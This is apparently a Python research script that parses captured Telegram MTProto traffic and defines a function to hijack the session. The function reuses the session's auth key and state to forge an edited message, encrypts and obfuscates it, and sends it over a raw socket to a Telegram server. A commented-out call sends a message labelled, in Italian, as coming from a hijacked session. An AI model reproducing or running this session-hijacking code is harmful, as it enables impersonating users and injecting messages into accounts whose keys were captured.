from read_capture import *


def send_edited_message(data : str, last_outgoing_message :TGMessage, template_send_message):
    session = last_outgoing_message.session
    decoded_message = deserialize_TL_message(template_send_message.message_data_plaintext)
    decoded_message.message = data
    decoded_message.random_id = -1 * random.randrange(0, 1<<63)
    # decoded_message.peer.user_id = 740952845

    print(decoded_message)
    decoded_edited_message = bytes(decoded_message)
    tg_message_to_send = TGMessage(plaintext_bytes=bytearray(decoded_edited_message), session=session,
                                   msg_type="client_msg", silent=True, colored=True,
                                   instant=True)
    print("MESSAGE TO SEND")
    print(to_hex_str(tg_message_to_send.message_data_plaintext))
    print(deserialize_TL_message(decoded_edited_message).to_dict())
    cipher_obf_enc, cipher_obf_dec, init = create_obfuscation_ciphers(0xef)
    obfuscated_bytes = cipher_obf_enc.encrypt(tg_message_to_send.complete_bytes_ciphertext)

    init_and_obfuscated_bytes = init + obfuscated_bytes
    confirm = input("Are you sure? yes/(no)")
    if confirm == "yes":
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(("149.154.167.91", 443))
        client_socket.send(init_and_obfuscated_bytes)
        sleep(3)

    cipher_obf_enc, cipher_obf_dec, init = derive_deobfuscation_ciphers(init_and_obfuscated_bytes)
    print(to_hex_str(init))
    deobfuscated_bytes = bytearray(cipher_obf_enc.decrypt(init_and_obfuscated_bytes[64:]))
    print(to_hex_str(tg_message_to_send.plaintext))
    message = TGMessage(ciphertext_bytes = deobfuscated_bytes, msg_type="client_msg", silent=True, colored=True, instant=True, session = MtprotoSession(session.auth_key))
    print(deserialize_TL_message(message.message_data_plaintext).to_dict())
    print(to_hex_str(message.plaintext))
    print(to_hex_str(last_outgoing_message.seqNo))

    print("Salt:")
    print(to_hex_str(message.session.salt))
    print("Session ID:")
    print(to_hex_str(message.session.session_id))
    print("SeqNo:")
    print(bytes_to_int(message.seqNo, little= True))



def main():
    streams = (read_stream("capture/out0", "capture/in0", True, False))
    for stream in streams:
        for message in stream:
            print (message)
    # if template_send_message is None:
    #     print("Error, no template message found")
    # else:
    #     send_edited_message("messaggio da una sessione hijackata", outgoing_messages[-1], template_send_message)
    #     pass


if __name__ == "__main__":
    main()